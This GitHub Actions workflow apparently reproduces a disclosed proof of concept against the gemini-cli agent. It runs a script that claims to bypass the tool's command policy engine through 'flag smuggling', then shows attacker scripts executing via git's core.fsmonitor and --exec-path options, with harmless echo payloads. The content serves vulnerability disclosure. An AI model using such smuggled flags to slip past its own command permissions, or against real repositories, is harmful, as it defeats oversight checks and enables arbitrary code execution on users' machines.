name: gemini-poc

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  reproduce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout this repo
        uses: actions/checkout@v4

      - name: Clone gemini-cli
        run: |
          git clone https://github.com/google-gemini/gemini-cli.git gemini-cli
          echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"

      - name: Install deps and tsx
        run: |
          cd gemini-cli/packages/core
          npm install 2>/dev/null | tail -3 || true
          npm install --no-save tsx

      - name: Copy PoC into correct location
        run: |
          cp poc_flag_smuggling.ts \
            gemini-cli/packages/core/src/policy/poc_flag_smuggling.ts

      - name: Part 1 - policy engine bypass
        run: |
          LOG="$GITHUB_WORKSPACE/poc-results.log"
          {
            echo "======================================================================"
            echo "PART 1 -- PolicyEngine bypass (real code, real CI)"
            echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"
            echo "======================================================================"
          } | tee -a "$LOG"

          cd gemini-cli
          npx tsx packages/core/src/policy/poc_flag_smuggling.ts 2>&1 \
            | tee -a "$LOG"

      - name: Part 2 - attacker script actually executes
        run: |
          LOG="$GITHUB_WORKSPACE/poc-results.log"
          {
            echo ""
            echo "======================================================================"
            echo "PART 2 -- attacker script actually executes"
            echo "======================================================================"
          } | tee -a "$LOG"

          mkdir -p /tmp/testrepo && cd /tmp/testrepo
          git init -q
          git config user.email "poc@test.com"
          git config user.name "PoC"
          echo "tracked" > file.txt
          git add file.txt
          git commit -q -m "init"

          printf '#!/bin/sh\necho "[ATTACKER EXECUTED via core.fsmonitor] user=$(id -un)"\n' \
            > /tmp/evil.sh && chmod +x /tmp/evil.sh

          echo "--- git -c core.fsmonitor=/tmp/evil.sh status ---" | tee -a "$LOG"
          git -c core.fsmonitor=/tmp/evil.sh status 2>&1 | tee -a "$LOG" || true
          echo "" | tee -a "$LOG"

          printf '#!/bin/sh\necho "[ATTACKER git-status via --exec-path] ran instead of real git-status"\n' \
            > /tmp/git-status && chmod +x /tmp/git-status

          echo "--- git --exec-path=/tmp status ---" | tee -a "$LOG"
          git --exec-path=/tmp status 2>&1 | tee -a "$LOG" || true

      - name: Upload log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: gemini-poc-results
          path: poc-results.log
